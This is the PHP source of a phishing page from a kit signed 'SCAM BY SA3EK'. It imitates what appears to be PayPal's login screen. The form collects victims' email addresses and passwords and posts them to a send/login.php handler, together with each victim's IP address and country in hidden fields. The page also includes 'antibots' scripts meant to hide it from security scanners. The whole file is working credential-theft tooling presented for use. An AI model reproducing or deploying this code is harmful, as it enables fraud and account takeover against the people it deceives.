<?php
    session_start();
    error_reporting(E_ERROR | E_PARSE);
    include('antibots/bot.php');
    include('antibots/checkbots.php');
	include('antibots/perfect.php');
    /******
    SCAM BY SA3EK
    ICQ : 740900705
    *******/
    if(isset($_SESSION['xfilelangx'])){
        include('langue/'.$_SESSION['xfilelangx']);
    }
    else {
        include('langue/en.php');
    }
?>
<!DOCTYPE html>
<html lang="en" class="no-js desktop">

<head>
    <meta charset="utf-8" />
    <title>(
        <?php echo $_SESSION['xcountryCodex']; ?>)
        <?php echo $xys9x; ?>
    </title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <link rel="shortcut icon" href="open/img/favicon/fav.ico" />
    <link rel="apple-touch-icon" href="open/img/pp64.png" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
    <link rel="stylesheet" href="open/css/xcontexLogx.css" />
</head>

<body class="desktop">
    <div id="main" class="main" role="main">
        <section id="login" class="login " data-role="page">
            <div class="corral">
                <div class="contentContainer activeContent">
                    <header>
                        <p class="xyslogoppx xyslogoppx-long"></p>
                    </header>
                    <div class="notifications hide">
                        <p class="notification notification-critical" role="alert">
                            <?php echo $xys10x; ?>
                        </p>
                    </div>
                    <form action="send/login.php" method="post" class="proceed maskable" autocomplete="off" novalidate>
                        <div id="emailSection" class="clearfix">
                            <div class="textInput" id="login_emaildiv">
                                <div class="fieldWrapper"> <label for="email" class="fieldLabel"><?php echo $xys11x; ?></label> <input id="xysemailx" name="xysemailx" type="email" class="hasHelp validateEmpty " required="required" value="" autocomplete="off" placeholder="<?php echo $xys11x; ?>"
                                        aria-describedby="emailErrorMessage" /></div>
                                <div class="errorMessage" id="emailErrorMessage">
                                    <p class="emptyError hide">
                                        <?php echo $xys12x; ?>
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div id="passwordSection" class="clearfix">
                            <div class="textInput" id="login_passworddiv">
                                <div class="fieldWrapper"> <label for="password" class="fieldLabel"><?php echo $xys13x; ?></label> <input id="xyspassx" name="xyspassx" type="password" class="hasHelp validateEmpty pin-password" required="required" value="" placeholder="<?php echo $xys13x; ?>"
                                        aria-describedby="passwordErrorMessage" /> <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Show password"><?php echo $xys14x; ?></button> <button type="button"
                                        class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide"><?php echo $xys15x; ?></button></div>
                                <div class="errorMessage" id="passwordErrorMessage">
                                    <p class="emptyError hide">
                                        <?php echo $xys16x; ?>
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="actions actionsSpacedShort"> <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="<?php echo $xys17x; ?>"><?php echo $xys17x; ?></button></div> <input type="hidden" name="splitLoginCookiedFallback"
                            value="true"> <input type="hidden" name="notifications" value="<?php echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>"> <input type="hidden" name="actionsSpacedShort" value="<?php echo $_SESSION['xcountryx']; ?>"> <input type="hidden"
                            name="splitLoginContext" value="<?php echo $_SESSION['xipx']; ?>"></form>
                    <div class="forgotLink">
                        <a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink">
                            <?php echo $xys18x; ?>
                        </a>
                    </div>
                    <div id="signupContainer" class="signupContainer">
                        <div class="loginSignUpSeparator"> <span class="textInSeparator"><?php echo $xys19x; ?></span></div>
                        <a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">
                            <?php echo $xys20x; ?>
                        </a>
                    </div>
                </div>
            </div>
        </section>
        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <ul class="footerGroup">
                    <li>
                        <a href="#">
                            <?php echo $xys5x; ?>
                        </a>
                    </li>
                    <li>
                        <a href="#">
                            <?php echo $xys6x; ?>
                        </a>
                    </li>
                    <li>
                        <a href="#">
                            <?php echo $xys7x; ?>
                        </a>
                    </li>
                    <li>
                        <a href="#">
                            <?php echo $xys8x; ?>
                        </a>
                    </li>
                </ul>
            </div>
        </footer>
    </div>
    <div class="transitioning" style="display: none;">
        <p class="checkingInfo hide">Checking your info…</p>
        <p class="oneSecond hide">Just a second…</p>
        <p class="secureMessage hide">Securely logging you in...</p>
        <p class="oneTouchMessage hide"></p>
        <p class="retrieveInfo hide">Retrieving your info...</p>
        <p class="waitFewSecs hide">This may take a few seconds...</p>
    </div>
    <script src="open/js/jquery.min.js"></script>
    <script src="open/js/xsinauthx.js"></script>
    <script src="open/js/xppappx.js"></script>
</body>

</html>